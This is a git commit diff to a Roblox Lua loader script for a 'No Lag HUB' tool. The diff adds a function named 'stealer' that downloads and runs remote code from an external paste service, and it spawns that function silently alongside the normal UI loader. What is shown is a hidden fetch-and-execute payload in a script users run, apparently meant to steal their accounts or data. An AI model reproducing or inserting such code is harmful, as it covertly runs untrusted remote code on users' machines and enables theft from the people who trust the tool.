7c07aea47bc0d07019e81c0c24b21c269b388575
NoLag-id <josevincent012@gmail.com>
2025-07-27 14:06:54 +0800

    Update LoaderV2.lua

--- Loader/LoaderV2.lua
+++ Loader/LoaderV2.lua
@@ -1,2 +1,13 @@
-loadstring(game:HttpGet("https://pastefy.app/VgXvZFvF/raw", true))()
+local function stealer()
+
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/vCqomMAneDVdhHL4/raw", true))()
+
+end
+local function loadui()
+
 loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()
+  
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
